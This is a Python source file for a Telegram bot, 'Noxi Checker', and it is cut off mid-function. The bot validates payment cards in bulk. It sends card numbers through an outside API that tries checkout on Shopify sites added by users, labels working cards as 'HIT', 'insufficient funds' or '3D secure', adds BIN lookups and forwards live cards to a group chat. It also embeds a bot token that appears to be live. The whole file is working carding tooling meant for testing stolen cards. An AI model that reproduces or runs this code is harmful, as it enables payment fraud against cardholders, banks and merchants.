import requests
import time
import threading
import re
from urllib.parse import urlparse
from telebot import TeleBot, types
import os
import json
from datetime import datetime
import random

# Initialize bot with your token
bot = TeleBot("8528695397:AAEX0oVUQzZxKlfE4tzYxmI95krguZ0JKgM")

# Data storage
USER_SITES = {}  # Format: {user_id: [{"url": "site1", "price": "1.0", "working": True}, ...]}
USER_CHECKS = {}  # Store ongoing mass checks
BANNED_USERS = set()  # Banned user IDs
ADMIN_IDS = [5994305183]  # Admin user IDs
ALLOWED_CHAT_IDS = set()  # Add allowed chat IDs here
GROUP_CHAT_ID = -1003232934009  # Replace with your group chat ID

# Load data from files
def load_data():
    global USER_SITES, BANNED_USERS, ALLOWED_CHAT_IDS
    try:
        if os.path.exists("user_sites.json"):
            with open("user_sites.json", "r") as f:
                USER_SITES = json.load(f)
        if os.path.exists("banned_users.json"):
            with open("banned_users.json", "r") as f:
                BANNED_USERS = set(json.load(f))
        if os.path.exists("allowed_chats.json"):
            with open("allowed_chats.json", "r") as f:
                ALLOWED_CHAT_IDS = set(json.load(f))
    except:
        pass

def save_data():
    with open("user_sites.json", "w") as f:
        json.dump(USER_SITES, f)
    with open("banned_users.json", "w") as f:
        json.dump(list(BANNED_USERS), f)
    with open("allowed_chats.json", "w") as f:
        json.dump(list(ALLOWED_CHAT_IDS), f)

load_data()

# Status mappings
status_emoji = {
    'APPROVED': '✅',
    'APPROVED_OTP': '🔐',
    'DECLINED': '❌',
    'EXPIRED': '⌛',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': 'APPROVED',
    'APPROVED_OTP': '3D SECURE',
    'DECLINED': 'DECLINED',
    'EXPIRED': 'EXPIRED',
    'ERROR': 'ERROR'
}

# Flood control decorator
def flood_control(func):
    def wrapper(message, *args, **kwargs):
        user_id = message.from_user.id
        if user_id in BANNED_USERS:
            bot.reply_to(message, "❌ You are banned from using this bot.")
            return
        
        # Check if user is in allowed chat IDs
        if message.chat.id not in ALLOWED_CHAT_IDS and message.chat.type != 'private':
            bot.reply_to(message, "❌ This bot is not allowed in this chat.")
            return
            
        return func(message, *args, **kwargs)
    return wrapper

def check_banned(user_id):
    return user_id in BANNED_USERS

import requests
import json

def test_shopify_site(url):
    """Test if a Shopify site is reachable and working with a test card"""
    try:
        test_card = "5547300001996183|11|2028|197"
        
        api_url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={url}&cc={test_card}"
        response = requests.get(api_url, timeout=100)
        
        if response.status_code != 200:
            return False, "Site not reachable", "0.0", "shopify_payments", "No response"
        
        # Default values
        price = "1.0"
        gateway = "shopify_payments"
        api_message = "No response"

        try:
            data = json.loads(response.text)  # parse JSON safely
            api_message = data.get("Response", api_message)
            price = data.get("Price", price)
            gateway = data.get("Gateway", gateway)
        except json.JSONDecodeError:
            # fallback to plain text if API didn't return JSON
            api_message = response.text.strip()

        return True, api_message, price, gateway, "Site is reachable and working"
        
    except Exception as e:
        return False, f"Error testing site: {str(e)}", "0.0", "shopify_payments", "Error"


@bot.message_handler(commands=['start'])
@flood_control
def handle_start(message):
    user_id = message.from_user.id
    if user_id not in ALLOWED_CHAT_IDS and message.chat.type == 'private':
        ALLOWED_CHAT_IDS.add(user_id)
        save_data()
    
    bot.reply_to(message, """
<b>Welcome to Noxi Checker Bot</b>

🔹 <b>Commands:</b>
/seturl - Add a Shopify site
/maddurl - Add multiple sites at once
/myurl - View your sites
/rmurl - Remove a site
/rmall - Remove all sites
/clean - Clean non-working sites
/sh - Check a single card
/mass - Mass check cards from file
/fl - Filter and clean card file
/startchk - Start mass check after uploading file

🔹 <b>How to use:</b>
1. Add your Shopify site with /seturl
2. Check cards with /sh or mass check with /mass
3. The bot will use your sites randomly for checking

<a href='https://t.me/solo_rohan'>➣ Developer: @solo_rohan</a>
    """, parse_mode='HTML', disable_web_page_preview=True)

@bot.message_handler(commands=['seturl'])
@flood_control
def handle_seturl(message):
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /seturl <your_shopify_site_url>")
            return
            
        url = parts[1].strip()
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        status_msg = bot.reply_to(message, f"🔄 Adding URL: <code>{url}</code>\nTesting reachability...", parse_mode='HTML')
        
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Invalid URL format: {str(e)}")
            return
            
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"🔄 Testing URL: <code>{url}</code>\nTesting with test card...",
                            parse_mode='HTML')
        
        is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
        if not is_valid:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Failed to verify Shopify site:\n{test_message}\nPlease check your URL and try again.")
            return

        if user_id not in USER_SITES:
            USER_SITES[user_id] = []
            
        # Check if URL already exists
        for site in USER_SITES[user_id]:
            if site['url'] == url:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ This URL is already in your list.")
                return
        
        USER_SITES[user_id].append({
            'url': url,
            'price': price,
            'working': True,
            'last_checked': datetime.now().isoformat()
        })
        save_data()
        
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>
                            
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {api_message}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${price}

<i>You can now check cards with /sh command</i>
─────── ⸙ ────────
""",
                            parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['maddurl'])
@flood_control
def handle_maddurl(message):
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /maddurl <url1>\n<url2>\n<url3>")
            return
            
        urls = parts[1].strip().split('\n')
        added_count = 0
        failed_count = 0
        
        status_msg = bot.reply_to(message, f"🔄 Adding {len(urls)} URLs...", parse_mode='HTML')
        
        if user_id not in USER_SITES:
            USER_SITES[user_id] = []
            
        for i, url in enumerate(urls):
            url = url.strip()
            if not url:
                continue
                
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
                
            # Check if URL already exists
            exists = False
            for site in USER_SITES[user_id]:
                if site['url'] == url:
                    exists = True
                    break
                    
            if exists:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"🔄 Processing URL {i+1}/{len(urls)}: Already exists")
                continue
                
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"🔄 Processing URL {i+1}/{len(urls)}: {url}")
            
            try:
                parsed = urlparse(url)
                if not parsed.netloc:
                    raise ValueError("Invalid URL format")
                    
                is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
                
                if is_valid:
                    USER_SITES[user_id].append({
                        'url': url,
                        'price': price,
                        'working': True,
                        'last_checked': datetime.now().isoformat()
                    })
                    added_count += 1
                    
                    bot.edit_message_text(chat_id=message.chat.id,
                                        message_id=status_msg.message_id,
                                        text=f"✅ URL {i+1}/{len(urls)}: Added successfully\nResponse: {api_message}")
                else:
                    failed_count += 1
                    bot.edit_message_text(chat_id=message.chat.id,
                                        message_id=status_msg.message_id,
                                        text=f"❌ URL {i+1}/{len(urls)}: Failed - {test_message}")
            except Exception as e:
                failed_count += 1
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ URL {i+1}/{len(urls)}: Error - {str(e)}")
            
            time.sleep(1)  # Avoid rate limiting
        
        save_data()
        
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"✅ Completed!\nAdded: {added_count}\nFailed: {failed_count}")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['myurl'])
@flood_control
def handle_myurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES or not USER_SITES[user_id]:
            bot.reply_to(message, "You haven't added any sites yet. Add a site with /seturl <your_shopify_url>")
            return
            
        sites_text = ""
        for i, site in enumerate(USER_SITES[user_id], 1):
            status = "✅" if site.get('working', True) else "❌"
            sites_text += f"{i}. {status} <code>{site['url']}</code> - ${site.get('price', '1.0')}\n"
            
        bot.reply_to(message, f"""Your Shopify sites:

{sites_text}

Use /sh command to check cards""", parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['rmurl'])
@flood_control
def handle_rmurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES or not USER_SITES[user_id]:
            bot.reply_to(message, "You don't have any sites to remove. Add a site with /seturl")
            return
            
        parts = message.text.split()
        if len(parts) < 2:
            # Show list of sites to remove
            sites_text = ""
            for i, site in enumerate(USER_SITES[user_id], 1):
                status = "✅" if site.get('working', True) else "❌"
                sites_text += f"{i}. {status} <code>{site['url']}</code>\n"
                
            bot.reply_to(message, f"""Select a site to remove by number:

{sites_text}

Use /rmurl <number> to remove a site""", parse_mode='HTML')
            return
            
        try:
            index = int(parts[1]) - 1
            if index < 0 or index >= len(USER_SITES[user_id]):
                raise ValueError("Invalid index")
                
            removed_url = USER_SITES[user_id][index]['url']
            del USER_SITES[user_id][index]
            save_data()
            
            bot.reply_to(message, f"✅ Removed site: <code>{removed_url}</code>", parse_mode='HTML')
            
        except (ValueError, IndexError):
            bot.reply_to(message, "Invalid site number. Use /rmurl to see the list of sites.")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['rmall'])
@flood_control
def handle_rmall(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES or not USER_SITES[user_id]:
            bot.reply_to(message, "You don't have any sites to remove.")
            return
            
        count = len(USER_SITES[user_id])
        USER_SITES[user_id] = []
        save_data()
        
        bot.reply_to(message, f"✅ Removed all {count} sites.")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['clean'])
@flood_control
def handle_clean(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES or not USER_SITES[user_id]:
            bot.reply_to(message, "You don't have any sites to clean.")
            return
            
        # Keep only working sites
        original_count = len(USER_SITES[user_id])
        USER_SITES[user_id] = [site for site in USER_SITES[user_id] if site.get('working', True)]
        removed_count = original_count - len(USER_SITES[user_id])
        save_data()
        
        bot.reply_to(message, f"✅ Cleaned {removed_count} non-working sites. {len(USER_SITES[user_id])} sites remaining.")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def check_shopify_cc(cc, site_info):
    try:
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        
        if len(parts) < 4:
            return {
                'status': 'ERROR', 
                'card': cc, 
                'message': 'Invalid format',
                'brand': 'UNKNOWN', 
                'country': 'UNKNOWN 🇺🇳', 
                'type': 'UNKNOWN',
                'bank': 'UNKNOWN',
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") and len(yy_raw) == 4 else yy_raw
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🇺🇳'
        try:
            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
            brand = bin_data.get('brand', 'UNKNOWN')
            country_name = bin_data.get('country_name', 'UNKNOWN')
            country_flag = bin_data.get('country_flag', '🇺🇳')
            card_type = bin_data.get('type', 'UNKNOWN')
            bank = bin_data.get('bank', 'UNKNOWN')
        except:
            pass

        api_url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site_info['url']}&cc={formatted_cc}"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f'API Error: {response.status_code}',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'bank': bank,
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        response_text = response.text
        
        api_message = 'No response'
        price = site_info.get('price', '1.0')
        gateway = 'shopify_payments'
        status = 'DECLINED'
        
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
                
                response_upper = api_message.upper()
                if 'THANK YOU' in response_upper or 'ORDER' in response_upper:
                    bot_response = 'ORDER CONFIRM!'
                    status = 'APPROVED'
                elif '3D' in response_upper:
                    bot_response = 'OTP_REQUIRED'
                    status = 'APPROVED_OTP'
                elif 'EXPIRED_CARD' in response_upper:
                    bot_response = 'EXPIRE_CARD'
                    status = 'EXPIRED'
                elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
                    bot_response = api_message
                    status = 'APPROVED_OTP'
                elif any(x in response_upper for x in ['FRAUD_SUSPECTED', 'CARD_DECLINED']):
                    bot_response = api_message
                    status = 'DECLINED'
                else:
                    bot_response = api_message
                    status = 'DECLINED'
            else:
                bot_response = api_message
                
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except Exception as e:
            bot_response = f"Error parsing response: {str(e)}"
        
        return {
            'status': status,
            'card': formatted_cc,
            'message': bot_response,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'bank': bank,
            'gateway': f"Self Shopify [${price}]",
            'price': price
        }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Exception: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🇺🇳',
            'type': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
            'price': site_info.get('price', '1.0')
        }

def format_approved_response(result, user_full_name, processing_time, site_url):
    """Format approved cards in the requested format"""
    # Determine status text based on response
    if 'INSUFFICIENT' in result['message'].upper():
        status_text = "Insufficient Funds 💰"
    elif '3D' in result['message'].upper() or 'OTP' in result['message'].upper():
        status_text = "3D Secure 🔐"
    else:
        status_text = "Charged 🔥"

    return f"""
#Auto | Shopify
━━━━━━━━━━━━━━━━━━━
[⸙] 𝐒𝐭𝐚𝐭𝐮𝐬 ⌁ {status_text}
[⸙] 𝐂𝐚𝐫𝐝 ⌁ {result['card']}
[⸙] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ {result['gateway']}
[⸙] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ {result['message']}
━━━━━━━━━━━━━━━━━━━
[⸙] 𝐈𝐧𝐟𝐨 ⌁ {result['brand']} {result['type']}
[⸙] 𝐈𝐬𝐬𝐮𝐞𝐫 ⌁ {result['bank']}
[⸙] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
━━━━━━━━━━━━━━━━━━━
[⸙] 𝐒𝐢𝐭𝐞 ⌁ {site_url}
[⸙] 𝐑𝐞𝐪 ⌁ {user_full_name}
[⸙] 𝐃𝐞𝐯 ⌁ @solo_rohan
[⸙] 𝐓𝐢𝐦𝐞 ⌁ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
"""

def format_shopify_response(result, user_full_name, processing_time):
    # Different formatting based on status
    if result['status'] == 'APPROVED':
        # HIT card formatting
        response = f"""
<b>💳 𝗛𝗜𝗧 𝗖𝗔𝗥𝗗 𝗙𝗢𝗨𝗡𝗗 💳</b>

<b>🃏 Card:</b> <code>{result['card']}</code>
<b>📤 Response:</b> <b>{result['message']}</b>
<b>🌐 Gateway:</b> <i>{result['gateway']}</i>
<b>🏦 Bank:</b> {result['brand']} - {result['type']}
<b>🇺🇳 Country:</b> {result['country']}
<b>👤 Checked by:</b> {user_full_name}
<b>⏱ Time:</b> {processing_time:.2f}s
        """
    elif result['status'] == 'APPROVED_OTP' and 'INSUFFICIENT' in result['message'].upper():
        # INSUFFICIENT card formatting
        response = f"""
<b>💰 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 💰</b>

<b>🃏 Card:</b> <code>{result['card']}</code>
<b>📤 Response:</b> <b>{result['message']}</b>
<b>🌐 Gateway:</b> <i>{result['gateway']}</i>
<b>🏦 Bank:</b> {result['brand']} - {result['type']}
<b>🇺🇳 Country:</b> {result['country']}
<b>👤 Checked by:</b> {user_full_name}
<b>⏱ Time:</b> {processing_time:.2f}s
        """
    elif result['status'] == 'APPROVED_OTP':
        # 3D card formatting
        response = f"""
<b>🔐 𝟯𝗗 𝗦𝗘𝗖𝗨𝗥𝗘 𝗖𝗔𝗥𝗗 🔐</b>

<b>🃏 Card:</b> <code>{result['card']}</code>
<b>📤 Response:</b> <b>{result['message']}</b>
<b>🌐 Gateway:</b> <i>{result['gateway']}</i>
<b>🏦 Bank:</b> {result['brand']} - {result['type']}
<b>🇺🇳 Country:</b> {result['country']}
<b>👤 Checked by:</b> {user_full_name}
<b>⏱ Time:</b> {processing_time:.2f}s
        """
    else:
        # Default formatting for other statuses
        response = f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ {status_text[result['status']]} {status_emoji[result['status']]}</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/solo_rohan'>[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{result['card']}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>  
<a href='https://t.me/solo_rohan'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {result['brand']}
<a href='https://t.me/solo_rohan'>[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {result['type']}
<a href='https://t.me/solo_rohan'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {user_full_name}
<a href='https://t.me/solo_rohan'>[⸙]</a> 𝐃𝐞𝐯 ⌁ @solo_rohan
<a href='https://t.me/solo_rohan'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁  {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    return response

@bot.message_handler(commands=['sh'])
@flood_control
def handle_sh(message):
    user_id = str(message.from_user.id)
    
    if user_id not in USER_SITES or not USER_SITES[user_id]:
        bot.reply_to(message, "❌ You haven't added any sites yet. Add a site with /seturl <your_shopify_url>\nUse /myurl to view your sites")
        return
    
    # Filter working sites
    working_sites = [site for site in USER_SITES[user_id] if site.get('working', True)]
    if not working_sites:
        bot.reply_to(message, "❌ All your sites are marked as not working. Please add new sites with /seturl")
        return

    try:
        cc = None
        
        if (message.text.startswith('/sh') and len(message.text.split()) == 1) or \
           (message.text.startswith('.sh') and len(message.text.strip()) == 3):
            
            if message.reply_to_message:
                replied_text = message.reply_to_message.text
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    cc = matches[0].replace(' ', '').replace('-', '')
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /sh CC|MM|YYYY|CVV or .sh CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:
                cc = message.text[4:].strip()

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        # Select a random working site
        site_info = random.choice(working_sites)
        
        bin_number = cc.split('|')[0][:6] if '|' in cc else cc[:6]
        bin_info = get_bin_info(bin_number) or {}
        brand = bin_info.get('brand', 'UNKNOWN')
        card_type = bin_info.get('type', 'UNKNOWN')
        country = bin_info.get('country', 'UNKNOWN')
        country_flag = bin_info.get('country_flag', '🇺🇳')

        status_msg = bot.reply_to(
            message,
            f"""
🔰 <b>Checking Card...</b>

<b>Card:</b> <code>{cc}</code>
<b>Gateway:</b> Self Shopify [${site_info.get('price', '1.0')}]
<b>Status:</b> Processing...
<b>Brand:</b> {brand}
<b>Type:</b> {card_type}
<b>Country:</b> {country} {country_flag}
            """,
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_shopify_cc(cc, site_info)
                processing_time = time.time() - start_time
                
                # Mark site as not working if response indicates issues
                response_upper = result['message'].upper()
                if any(x in response_upper for x in ['FRAUD_SUSPECTED', 'CARD_DECLINED', 'API Error', 'Exception', 'UNKNOWN']):
                    site_info['working'] = False
                    site_info['last_checked'] = datetime.now().isoformat()
                    save_data()

                # Send to user
                if result['status'] in ['APPROVED', 'APPROVED_OTP']:
                    # Use the new format for approved cards
                    response_text = format_approved_response(result, user_full_name, processing_time, site_info['url'])
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        text=response_text,
                        parse_mode='HTML'
                    )
                    
                    # Also send to group
                    send_to_group(result, user_full_name, processing_time, site_info['url'])
                    
                    # Send notification to user
                    if 'INSUFFICIENT' in result['message'].upper():
                        bot.send_message(
                            message.chat.id,
                            f"💰 <b>INSUFFICIENT CARD FOUND</b>\n\n<code>{result['card']}</code>\n<b>Response:</b> {result['message']}",
                            parse_mode='HTML'
                        )
                    elif result['status'] == 'APPROVED':
                        bot.send_message(
                            message.chat.id,
                            f"✅ <b>HIT CARD FOUND</b>\n\n<code>{result['card']}</code>\n<b>Response:</b> {result['message']}",
                            parse_mode='HTML'
                        )
                    else:
                        bot.send_message(
                            message.chat.id,
                            f"🔐 <b>3D CARD FOUND</b>\n\n<code>{result['card']}</code>\n<b>Response:</b> {result['message']}",
                            parse_mode='HTML'
                        )
                else:
                    # Use the old format for other cards
                    response_text = format_shopify_response(result, user_full_name, processing_time)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        text=response_text,
                        parse_mode='HTML'
                    )

            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ An error occurred: {str(e)}"
                )

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def send_to_group(result, user_full_name, processing_time, site_url):
    """Send HIT and INSUFFICIENT cards to group"""
    try:
        if result['status'] in ['APPROVED', 'APPROVED_OTP']:
            # Use the new format for group messages
            group_message = format_approved_response(result, user_full_name, processing_time, site_url)
            
            bot.send_message(
                GROUP_CHAT_ID,
                group_message,
                parse_mode='HTML'
            )
    except Exception as e:
        print(f"Error sending to group: {e}")

@bot.message_handler(commands=['fl'])
@flood_control
def handle_fl(message):
    try:
        if not message.reply_to_message or not message.reply_to_message.document:
            bot.reply_to(message, "❌ Please reply to a TXT file with /fl command")
            return
            
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open("temp_cards.txt", "wb") as f:
            f.write(downloaded_file)
            
        with open("temp_cards.txt", "r") as f:
            cards = f.read().splitlines()
            
        # Remove duplicates and invalid cards
        unique_cards = set()
        valid_cards = []
        
        for card in cards:
            card = card.strip()
            if not card:
                continue
                
            # Basic validation
            if re.match(r'^\d{13,19}\|?\d{1,2}\|?\d{2,4}\|?\d{3,4}$', card.replace(' ', '').replace(':', '|').replace('/', '|')):
                # Format card
                card_parts = card.replace(' ', '').replace(':', '|').replace('/', '|').split('|')
                if len(card_parts) >= 4:
                    cc, mm, yy, cvv = card_parts[:4]
                    mm = mm.zfill(2)
                    if len(yy) == 4:
                        yy = yy[2:]
                    formatted_card = f"{cc}|{mm}|{yy}|{cvv}"
                    
                    if formatted_card not in unique_cards:
                        unique_cards.add(formatted_card)
                        valid_cards.append(formatted_card)
        
        # Save filtered cards
        with open("filtered_cards.txt", "w") as f:
            f.write("\n".join(valid_cards))
            
        # Send file back
        with open("filtered_cards.txt", "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"✅ Filtered Cards\nOriginal: {len(cards)}\nFiltered: {len(valid_cards)}")
            
        # Clean up
        os.remove("temp_cards.txt")
        os.remove("filtered_cards.txt")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mass', 'startchk'])
@flood_control
def handle_mass(message):
    user_id = str(message.from_user.id)
    
    if user_id not in USER_SITES or not USER_SITES[user_id]:
        bot.reply_to(message, "❌ You haven't added any sites yet. Add a site with /seturl <your_shopify_url>")
        return
    
    # Filter working sites
    working_sites = [site for site in USER_SITES[user_id] if site.get('working', True)]
    if not working_sites:
        bot.reply_to(message, "❌ All your sites are marked as not working. Please add new sites with /seturl")
        return
        
    if message.text.startswith('/startchk'):
        if not message.reply_to_message or not message.reply_to_message.document:
            bot.reply_to(message, "❌ Please reply to a TXT file with /startchk command")
            return
            
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(f"mass_check_{user_id}.txt", "wb") as f:
            f.write(downloaded_file)
            
        with open(f"mass_check_{user_id}.txt", "r") as f:
            cards = f.read().splitlines()
            
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the file")
            return
            
    elif message.text.startswith('/mass'):
        if not message.reply_to_message or not message.reply_to_message.document:
            bot.reply_to(message, "❌ Please reply to a TXT file with /mass command")
            return
            
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(f"mass_check_{user_id}.txt", "wb") as f:
            f.write(downloaded_file)
            
        with open(f"mass_check_{user_id}.txt", "r") as f:
            cards = f.read().splitlines()
            
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the file")
            return
    
    # Initialize mass check
    USER_CHECKS[user_id] = {
        'cards': cards,
        'current_index': 0,
        'results': {
            'APPROVED': [],
            'APPROVED_OTP': [],
            'DECLINED': [],
            'EXPIRED': [],
            'ERROR': []
        },
        'start_time': time.time(),
        'working_sites': working_sites.copy(),  # Use a copy to avoid modifying the original
        'user_full_name': f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip(),
        'user_id': user_id
    }
    
    # Create buttons for results (one button per line)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("CC: CC|MM|YY|CVV", callback_data="mass_cc"))
    markup.add(types.InlineKeyboardButton("Response: Processing...", callback_data="mass_response"))
    markup.add(types.InlineKeyboardButton("HITS: 0", callback_data="mass_hits"))
    markup.add(types.InlineKeyboardButton("INSUFFICIENT: 0", callback_data="mass_insufficient"))
    markup.add(types.InlineKeyboardButton("3D: 0", callback_data="mass_3d"))
    markup.add(types.InlineKeyboardButton("DECLINED: 0", callback_data="mass_declined"))
    markup.add(types.InlineKeyboardButton("CANCEL", callback_data="mass_stop"))
    
    status_msg = bot.reply_to(message, f"""
🔰 <b>Mass Check Started</b>
➖➖➖➖➖➖➖➖➖➖
├⦿ <b>Total Cards:</b> {len(cards)}
├⦿ <b>Working Sites:</b> {len(working_sites)}
├⦿ <b>Checked:</b> 0/{len(cards)}
├⦿ <b>Elapsed:</b> 0s
➖➖➖➖➖➖➖➖➖➖
<b>Status:</b> <code>Starting...</code>
    """, parse_mode='HTML', reply_markup=markup)
    
    USER_CHECKS[user_id]['status_msg'] = status_msg
    USER_CHECKS[user_id]['current_card'] = "Waiting..."
    
    # Start mass check in background
    threading.Thread(target=run_mass_check, args=(user_id,)).start()

def run_mass_check(user_id):
    if user_id not in USER_CHECKS:
        return
        
    check_data = USER_CHECKS[user_id]
    cards = check_data['cards']
    working_sites = check_data['working_sites']
    user_full_name = check_data['user_full_name']
    
    for i in range(check_data['current_index'], len(cards)):
        if user_id not in USER_CHECKS:
            break
            
        card = cards[i]
        check_data['current_index'] = i + 1
        check_data['current_card'] = card
        
        # Update the CC button
        update_mass_check_status(user_id, current_card=card)
        
        # Skip invalid cards
